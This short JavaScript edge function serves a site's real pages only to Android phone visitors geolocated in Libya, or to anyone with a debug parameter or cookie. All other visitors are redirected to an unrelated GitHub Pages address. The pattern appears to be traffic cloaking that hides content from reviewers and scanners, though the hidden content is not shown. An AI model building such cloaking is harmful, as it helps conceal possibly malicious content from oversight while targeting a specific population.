function isAndroidPhone(ua) {
  return /Android/i.test(ua) && /Mobile/i.test(ua);
}

export const config = { path: "/*" };

export default async (request, context) => {
  const url = new URL(request.url);
  const debugParam = url.searchParams.get("debug") === "1";
  const cookieHeader = request.headers.get("cookie") || "";
  const debugCookie = cookieHeader
    .split(";")
    .map((cookie) => cookie.trim())
    .some((cookie) => cookie === "debug=1");
  const debug = debugParam || debugCookie;

  if (debug) {
    const response = await context.next();
    if (debugParam) {
      response.headers.append("set-cookie", "debug=1; Path=/; Max-Age=600");
    }
    return response;
  }

  const countryCode = context.geo?.country?.code || "";
  const ua = request.headers.get("user-agent") || "";

  const fromLibya = countryCode === "LY";
  const androidPhone = isAndroidPhone(ua);

  if (fromLibya && androidPhone) {
    return context.next();
  }

  return Response.redirect("https://superwork61-creator.github.io/balenformen/", 302);
};
